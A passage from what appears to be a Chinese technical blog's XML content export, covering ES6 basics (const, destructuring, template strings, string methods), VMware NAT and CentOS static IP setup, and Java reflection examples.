报错:Uncaught ReferenceError: Cannot access 'a' before initialization</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">const</span> arr = [<span class="string">'apple'</span>, <span class="string">'banana'</span>];</span><br><span class="line">    arr = [];</span><br><span class="line">    <span class="built_in">console</span>.log(arr);</span><br><span class="line">    <span class="comment">// 结果:Uncaught TypeError: Assignment to constant variable.</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">const</span> arr = [<span class="string">'apple'</span>, <span class="string">'banana'</span>];</span><br><span class="line">    arr.push(<span class="string">'orange'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(arr);</span><br><span class="line">    <span class="comment">// 对象本身是引用的,如果需要冻结对象本身，则需要使用Object.freeze(对象)</span></span><br><span class="line">    <span class="comment">// 输出：(3) ["apple", "banana", "orange"]</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Object-freeze-对象"><a href="#Object-freeze-对象" class="headerlink" title="Object.freeze(对象)"></a>Object.freeze(对象)</h3><p>对于对象常量，冻结对象本身则需要使用Object.freeze(对象)</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">const</span> arr = <span class="built_in">Object</span>.freeze([<span class="string">'apple'</span>, <span class="string">'banana'</span>]);</span><br><span class="line">    arr.push(<span class="string">'orange'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(arr);</span><br><span class="line">    <span class="comment">// Uncaught TypeError: Cannot add property 2, object is not extensible </span></span><br><span class="line">    <span class="comment">//      at Array.push (&lt;anonymous&gt;)</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>ES6</category>
      </categories>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>03_结构赋值</title>
    <url>/%E5%89%8D%E7%AB%AF/ES6/c968cb02.html</url>
    <content><![CDATA[<h2 id="结构赋值"><a href="#结构赋值" class="headerlink" title="结构赋值"></a>结构赋值</h2><p>解构赋值语法是一种 Javascript 表达式。通过解构赋值, 可以将属性/值从对象/数组中取出,赋值给其他变量。<br>非常有用，特别在做数据交互的时候(ajax)。</p><h3 id="正常赋值，零散，不直观。"><a href="#正常赋值，零散，不直观。" class="headerlink" title="正常赋值，零散，不直观。"></a>正常赋值，零散，不直观。</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">let</span> b = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> c = <span class="number">6</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(a,b,c);</span><br><span class="line">    <span class="comment">// 没有整齐划一，比较零散</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="数组定义，整齐但是依然不够直观"><a href="#数组定义，整齐但是依然不够直观" class="headerlink" title="数组定义，整齐但是依然不够直观"></a>数组定义，整齐但是依然不够直观</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>];</span><br><span class="line">    <span class="built_in">console</span>.log(arr[<span class="number">0</span>], arr[<span class="number">1</span>], arr[<span class="number">2</span>]);</span><br><span class="line">    <span class="comment">// 不直观</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="解构赋值使用了相同的语法，不同的是在表达式左边定义了要从原变量中取出什么变量。"><a href="#解构赋值使用了相同的语法，不同的是在表达式左边定义了要从原变量中取出什么变量。" class="headerlink" title="解构赋值使用了相同的语法，不同的是在表达式左边定义了要从原变量中取出什么变量。"></a>解构赋值使用了相同的语法，不同的是在表达式左边定义了要从原变量中取出什么变量。</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> [a,b,c] = [<span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>];</span><br><span class="line">    <span class="built_in">console</span>.log(a, b, c);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="json格式结构赋值"><a href="#json格式结构赋值" class="headerlink" title="json格式结构赋值"></a>json格式结构赋值</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> json = &#123;</span><br><span class="line">        name: <span class="string">"zhangsan"</span>,</span><br><span class="line">        age： <span class="number">18</span>,</span><br><span class="line">        job: <span class="string">"码畜"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> &#123;name, age, <span class="attr">job</span>:work&#125; = json;</span><br><span class="line">    <span class="built_in">console</span>.log(name, age, work);</span><br><span class="line">    <span class="comment">// 依次输出zhangsan 18 码畜</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="结构赋值缺少对应参数"><a href="#结构赋值缺少对应参数" class="headerlink" title="结构赋值缺少对应参数"></a>结构赋值缺少对应参数</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> [a, b, c] = [<span class="string">"aa"</span>, <span class="string">"bb"</span>]</span><br><span class="line">    <span class="built_in">console</span>.log(a, b, c);</span><br><span class="line">    <span class="comment">// 依次输出aa bb undefined</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="结构赋值给默认值"><a href="#结构赋值给默认值" class="headerlink" title="结构赋值给默认值"></a>结构赋值给默认值</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> [a, b, c=<span class="string">"暂无数据"</span>] = [<span class="string">"aa"</span>, <span class="string">"bb"</span>]</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a, b, c);</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 依次输出aa bb 暂无数据</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="结构赋值给默认值-null代表有值，并非无参数"><a href="#结构赋值给默认值-null代表有值，并非无参数" class="headerlink" title="结构赋值给默认值(null代表有值，并非无参数)"></a>结构赋值给默认值(null代表有值，并非无参数)</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> [a, b, c] = [<span class="string">"aa"</span>, <span class="string">"bb"</span>, <span class="literal">null</span>]</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a, b, c);</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 依次输出aa bb null</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="块级作用域-不建议使用，如果结构写的不好括号会被当做作用域"><a href="#块级作用域-不建议使用，如果结构写的不好括号会被当做作用域" class="headerlink" title="块级作用域(不建议使用，如果结构写的不好括号会被当做作用域)"></a>块级作用域(不建议使用，如果结构写的不好括号会被当做作用域)</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> a;</span></span><br><span class="line"><span class="actionscript">    (&#123;a&#125; = &#123;a:<span class="string">"apple"</span>, b:<span class="string">"banana"</span>&#125;);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 输出apple</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="交换ab的位置"><a href="#交换ab的位置" class="headerlink" title="交换ab的位置"></a>交换ab的位置</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> a = <span class="number">12</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> b = <span class="number">5</span>;</span></span><br><span class="line">    [a, b] = [b, a];</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a, b);</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 依次输出:5 12</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="传参不为空-结构赋值举例"><a href="#传参不为空-结构赋值举例" class="headerlink" title="传参不为空,结构赋值举例"></a>传参不为空,结构赋值举例</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">(&#123;a, b=<span class="string">"默认值"</span>&#125;)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a, b);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    show(&#123;</span><br><span class="line">        a:1</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="actionscript">    <span class="comment">// 依次输出:1 默认值</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="传参为空-结构赋值举例"><a href="#传参为空-结构赋值举例" class="headerlink" title="传参为空,结构赋值举例"></a>传参为空,结构赋值举例</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">(&#123;a=<span class="string">"默认值"</span>, b=<span class="string">"默认值"</span>&#125;=&#123;&#125;)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a, b);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    show(&#123;&#125;);</span><br><span class="line"><span class="actionscript">    <span class="comment">// 依次输出:默认值 默认值</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>ES6</category>
      </categories>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>05_函数默认参数、箭头函数、剩余参数</title>
    <url>/%E5%89%8D%E7%AB%AF/ES6/c110f5e5.html</url>
    <content><![CDATA[<h2 id="函数变化"><a href="#函数变化" class="headerlink" title="函数变化"></a>函数变化</h2><ol><li>函数默认参数</li></ol>]]></content>
      <categories>
        <category>前端</category>
        <category>ES6</category>
      </categories>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>04_字符串模板</title>
    <url>/%E5%89%8D%E7%AB%AF/ES6/46b63ea6.html</url>
    <content><![CDATA[<h2 id="字符串模板"><a href="#字符串模板" class="headerlink" title="字符串模板"></a>字符串模板</h2><p>优点: 可以随意换行<br>使用: `${变量名字}`</p><p>字符串模板便于处理ES5及之前的字符串拼接。ES6中字符串模板使用键盘上1数字前面，即Tab上放的按键`</p><h3 id="当我们使用ES5之前，拼接字符串如下-不直观-拼接容易出错"><a href="#当我们使用ES5之前，拼接字符串如下-不直观-拼接容易出错" class="headerlink" title="当我们使用ES5之前，拼接字符串如下(不直观,拼接容易出错)"></a>当我们使用ES5之前，拼接字符串如下(不直观,拼接容易出错)</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">"zhangsan"</span>;</span><br><span class="line"><span class="keyword">let</span> age = <span class="number">23</span>;</span><br><span class="line"><span class="keyword">let</span> str = <span class="string">"我叫"</span>+name+<span class="string">"，今年"</span>+<span class="number">23</span>+<span class="string">"岁。"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str);</span><br></pre></td></tr></table></figure><h3 id="使用ES6字符串模板，如下"><a href="#使用ES6字符串模板，如下" class="headerlink" title="使用ES6字符串模板，如下"></a>使用ES6字符串模板，如下</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">"zhangsan"</span>;</span><br><span class="line"><span class="keyword">let</span> age = <span class="number">23</span>;</span><br><span class="line"><span class="keyword">let</span> str = <span class="string">`我叫<span class="subst">$&#123;name&#125;</span>,今年<span class="subst">$&#123;age&#125;</span>岁。`</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str);</span><br></pre></td></tr></table></figure><h2 id="字符串新增的其它一些方法"><a href="#字符串新增的其它一些方法" class="headerlink" title="字符串新增的其它一些方法"></a>字符串新增的其它一些方法</h2><h3 id="字符串查找-【方法includes-quot-quot-ES2016即ES7出现的】"><a href="#字符串查找-【方法includes-quot-quot-ES2016即ES7出现的】" class="headerlink" title="字符串查找 【方法includes(&quot;&quot;),ES2016即ES7出现的】"></a>字符串查找 【方法includes(&quot;&quot;),ES2016即ES7出现的】</h3><p>str.indexOf(要找的东西) 返回索引,没找到返回-1<br>str.includes(要找的东西) 返回值 true/false</p><p>ES5及之前查找字符串如下:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">"apple banana pear"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看字符串中是否有apple,打印出来是0,不直观</span></span><br><span class="line"><span class="built_in">console</span>.log(str.indexOf(<span class="string">"apple"</span>));</span><br><span class="line"><span class="keyword">if</span>(str.indexOf(<span class="string">"pear"</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"找到pear字符串了"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"没有找到pear字符串"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ES6查找字符串如下:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">"apple banana pear"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(str.includes(<span class="string">"pear"</span>)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"找到pear字符串了"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"没有找到pear字符串"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断浏览器</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(navigator.userAgent.includes(<span class="string">"Chrome"</span>)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"是Chrome浏览器"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"不是Chrome浏览器"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串是否以特定字符开头"><a href="#字符串是否以特定字符开头" class="headerlink" title="字符串是否以特定字符开头"></a>字符串是否以特定字符开头</h3><p>str.startsWith(检测东西)</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> url = <span class="string">"http://localhost:4000/%E5%89%8D%E7%AB%AF/ES6/46b63ea6.html#more"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(url.startsWith(<span class="string">"http"</span>));</span><br><span class="line"><span class="comment">// 输出:true</span></span><br></pre></td></tr></table></figure><h3 id="字符串是否以特定字符结尾"><a href="#字符串是否以特定字符结尾" class="headerlink" title="字符串是否以特定字符结尾"></a>字符串是否以特定字符结尾</h3><p>str.endsWith(检测东西)</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> url = <span class="string">"photo.png"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(url.endsWith(<span class="string">"png"</span>);</span><br><span class="line"><span class="comment">// 输出:true</span></span><br></pre></td></tr></table></figure><h3 id="重复字符串"><a href="#重复字符串" class="headerlink" title="重复字符串"></a>重复字符串</h3><p>str.repeat(次数)</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">"牧马人"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str);</span><br><span class="line"><span class="comment">// 输出:牧马人</span></span><br><span class="line"><span class="built_in">console</span>.log(str.replace(<span class="number">3</span>));</span><br><span class="line"><span class="comment">// 输出:牧马人牧马人牧马人</span></span><br></pre></td></tr></table></figure><h3 id="填充字符串"><a href="#填充字符串" class="headerlink" title="填充字符串"></a>填充字符串</h3><p>str.padStart(整个字符串长度, 填充内容) 向前填充<br>str.padEnd(整个字符串长度, 填充内容) 向后填充</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">"a"</span>;</span><br><span class="line"><span class="keyword">let</span> padStr = <span class="string">"bcd"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str.padStart(str.length + padStr.length, padStr));</span><br><span class="line"><span class="comment">// 输出:bcda</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>ES6</category>
      </categories>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>01 VMware Workstation Pro网络Nat模式配置</title>
    <url>/Linux/8592866f.html</url>
    <content><![CDATA[<h2 id="VMware-Workstation-Pro网络Nat模式配置"><a href="#VMware-Workstation-Pro网络Nat模式配置" class="headerlink" title="VMware Workstation Pro网络Nat模式配置"></a>VMware Workstation Pro网络Nat模式配置</h2><h3 id="前景"><a href="#前景" class="headerlink" title="前景"></a>前景</h3><blockquote><p>我的目标是虚拟机可以上外网并且可以和主机进行通信，主机可以和虚拟机通信，和主机在局域网的机器可以通过端口转换访问主机的虚拟机中的机器。<br>由于桥接模式必须主机电脑连接网路由于我电脑偶尔会在断网情况下工作，因此这里只能选择Nat模式。<br>主机:主机电脑IP地址为:192.168.1.25(这个其实并不影响什么)<br>虚拟机： 默认网关192.168.6.2<br>虚拟机01： 192.168.6.3<br>虚拟机02： 192.168.6.4<br>虚拟机03： 192.168.6.5<br>···</p></blockquote><h3 id="Mware-Workstation-Pro网络Nat模式配置"><a href="#Mware-Workstation-Pro网络Nat模式配置" class="headerlink" title="Mware Workstation Pro网络Nat模式配置"></a>Mware Workstation Pro网络Nat模式配置</h3><p>首先，点击编辑按钮，选择虚拟机网络编辑器。如下图:</p><blockquote><p><img src="/images/linux/01-vm01.png" alt="avatar"></p></blockquote><p>其次,选择VMnet8，修改类型为Nat模式，更改子网IP，点击更改设置，设置子网IP为:192.168.6.0, 子网掩码为:255.255.255.0</p><blockquote><p><img src="/images/linux/01-vm02.png" alt="avatar"></p></blockquote><p>然后，修改默认网关（一般情况下修改好子网IP后默认网关自动回配置好）。点击Nat设置，修改网关IP为192.168.6.2即可。</p><blockquote><p><img src="/images/linux/01-vm03.png" alt="avatar"></p></blockquote><h3 id="主机局域网内访问虚拟机应用"><a href="#主机局域网内访问虚拟机应用" class="headerlink" title="主机局域网内访问虚拟机应用"></a>主机局域网内访问虚拟机应用</h3><blockquote><p>我在虚拟机里通过Gogs搭建了一个git服务器，<br>虚拟机环境为centos6，<br>设置的静态IP地址为:192.168.6.3。<br>主机可以通过<a href="http://192.168.6.3:10000去访问我的git仓库，" target="_blank" rel="noopener">http://192.168.6.3:10000去访问我的git仓库，</a><br>但是主机同局域网内的其他机器则不能访问。因此，我需要配置端口转发功能。<br>点击Nat设置，在端口转发下面选择添加，主机端口选择一个没有应用占用的端口即可，这里我选择9999，类型选择TCP，<br>虚拟机IP地址这里我自然选择192.168.6.3，可以填或者不写，这里描述我简单写为Gogs搭建的git仓库，然后点击确定就好。<br>最后测试，主机内局域网的机器顺利通过192.168.1.25:9999访问虚拟机（192.168.6.3:10000）中的gogs服务。<br>注意：192.168.1.25是我当前主机的IP的值，可通过IpConfig查看当前IP4地址。<br>当前，主机也可以通过<a href="http://192.168.1.25:9999或者http://192.168.6.3:10000，或者http://127.0.0.1:9999进行访问Gogs应用。" target="_blank" rel="noopener">http://192.168.1.25:9999或者http://192.168.6.3:10000，或者http://127.0.0.1:9999进行访问Gogs应用。</a><br>确保Windows服务启动项中，“VMware DHCP Service”、”VMware NAT Service”，两项服务是否启动</p></blockquote><h3 id="Linux下静态IP配置"><a href="#Linux下静态IP配置" class="headerlink" title="Linux下静态IP配置"></a>Linux下静态IP配置</h3><h4 id="cenots7-6下静态IP配置"><a href="#cenots7-6下静态IP配置" class="headerlink" title="cenots7.6下静态IP配置"></a>cenots7.6下静态IP配置</h4><p>首先，编辑etc/sysconfig/network-scripts/ifcfg-ens33文件</p><blockquote><p>[caifenglin@caifenglin /]$ vim etc/sysconfig/network-scripts/ifcfg-ens33</p><p>TYPE=Ethernet<br>PROXY_METHOD=none<br>BROWSER_ONLY=no<br>BOOTPROTO=static<br>DEFROUTE=yes<br>IPV4_FAILURE_FATAL=no<br>IPV6INIT=yes<br>IPV6_AUTOCONF=yes<br>IPV6_DEFROUTE=yes<br>IPV6_FAILURE_FATAL=no<br>IPV6_ADDR_GEN_MODE=stable-privacy<br>NAME=ens33<br>UUID=7533c908-1b34-4d82-a7f2-ab7bd4ac8838<br>DEVICE=ens33<br>ONBOOT=yes<br>IPADDR=192.168.6.4<br>NETMASK=255.255.255.0<br>NETWORK=192.168.6.2<br>DNS1=192.168.1.1<br>DNS2=8.8.8.8</p></blockquote><p>其次,修改/etc/sysconfig/network,配置网关，否则无法上网</p><blockquote><p>[caifenglin@caifenglin /]$ vim /etc/sysconfig/network</p><p>#Created by anaconda<br>NETWORKING=yes<br>GATEWAY=192.168.6.2<br>DNS1=192.168.1.1<br>DNS2=8.8.8.8</p></blockquote><p>重启网路服务</p><blockquote><p>service network restart</p></blockquote><h4 id="centos6-9下配置静态IP"><a href="#centos6-9下配置静态IP" class="headerlink" title="centos6.9下配置静态IP"></a>centos6.9下配置静态IP</h4><p>首先，编辑etc/sysconfig/network-scripts/ifcfg-ens33文件</p><blockquote><p>[caifenglin@suixin network-scripts]$ vim /etc/sysconfig/network-scripts/ifcfg-eth0</p><p>DEVICE=eth0<br>HWADDR=00:0C:29:97:FF:A5<br>TYPE=Ethernet<br>UUID=56cd27b3-48e7-453e-a365-cf1075ad70e5<br>ONBOOT=yes<br>NM_CONTROLLED=yes<br>BOOTPROTO=static<br>IPADDR=192.168.6.3<br>NETMASK=255.255.255.0<br>GATEWAY=192.168.6.2<br>DNS1=192.168.1.1<br>DNS2=114.114.114.114</p></blockquote><p>其次，修改/etc/resolv.conf 配置DNS</p><blockquote><p>[caifenglin@suixin network-scripts]$ vim /etc/resolv.conf</p><p># Generated by NetworkManager<br>nameserver 192.168.1.1<br>nameserver 114.114.114.114</p></blockquote><p>最后，重启网路服务</p><blockquote><p>运行”service network restart”命令，重启网络服务，使刚才修改的配置信息生效</p></blockquote>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>java反射机制</title>
    <url>/Java/3ecb78ee.html</url>
    <content><![CDATA[<h3 id="根据class获取java对象的三种方式"><a href="#根据class获取java对象的三种方式" class="headerlink" title="根据class获取java对象的三种方式"></a>根据class获取java对象的三种方式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一种方式</span></span><br><span class="line">Class c1 = Class.forName(<span class="string">"com.caifenglin.reflect.Employee"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种方式</span></span><br><span class="line"><span class="comment">// java中每个类型都class属性</span></span><br><span class="line">Class c2 = Employee<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三种方式</span></span><br><span class="line"><span class="comment">// java语言中任何一个java对象都有getClass方法</span></span><br><span class="line">Employee e = <span class="keyword">new</span> Employee();</span><br><span class="line"><span class="comment">// c3是运行时类(e的运行时类是Emplyoee)</span></span><br><span class="line">Class c3 = e.getClass();</span><br></pre></td></tr></table></figure><p>注意:在使用.class反射获取对象时不会执行对象中的静态代码块，如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflelctTest02</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 将A.class文件装载到JVM中的过程,会执行静态语句块</span></span><br><span class="line">		<span class="comment">// Class.forName("com.caifenglin.reflect.A");</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 不会执行静态语句块</span></span><br><span class="line">		Class c = com.caifenglin.reflect.A<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">"A········"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取Class类型的对象之后，可以创建该类的对象"><a href="#获取Class类型的对象之后，可以创建该类的对象" class="headerlink" title="获取Class类型的对象之后，可以创建该类的对象"></a>获取Class类型的对象之后，可以创建该类的对象</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectTest03</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		Class c = Class.forName(<span class="string">"com.caifenglin.reflect.Employee"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 创建此Class对象所表示的一个新实例,调用了Emplyoee的无参构造方法</span></span><br><span class="line">		Object o = c.newInstance();</span><br><span class="line">		System.out.println(o);</span><br><span class="line">		<span class="comment">// com.caifenglin.reflect.Employee@7852e922</span></span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		Class c1 = Class.forName(<span class="string">"java.util.Date"</span>);</span><br><span class="line">		Object o1 = c1.newInstance();</span><br><span class="line">		<span class="keyword">if</span>(o1 <span class="keyword">instanceof</span> Date) &#123;</span><br><span class="line">			Date d = (Date)o1;</span><br><span class="line">			System.out.println(<span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy年MM月dd日 HH时mm分ss秒"</span>).format(d));</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>java.lang.reflect.Field; 类中的属性反编译所有类中的属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  java.lang.reflect.Field; 类中的属性</span></span><br><span class="line"><span class="comment"> *  反编译所有类中的属性</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> caifenglin</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectTest04</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 获取整个类</span></span><br><span class="line">		Class c = Class.forName(<span class="string">"com.caifenglin.reflect.Student"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 获取属性Field</span></span><br><span class="line">		<span class="comment">// 获取所有public修饰的属性</span></span><br><span class="line">		Field[] fs = c.getFields();</span><br><span class="line">		</span><br><span class="line">		System.out.println(fs.length);</span><br><span class="line">		System.out.println(fs[<span class="number">0</span>]);</span><br><span class="line">		System.out.println(<span class="string">"======================="</span>);</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		Field[] dfs = c.getDeclaredFields();</span><br><span class="line">		<span class="comment">/*for (Field field : dfs) &#123;</span></span><br><span class="line"><span class="comment">			int i = field.getModifiers();</span></span><br><span 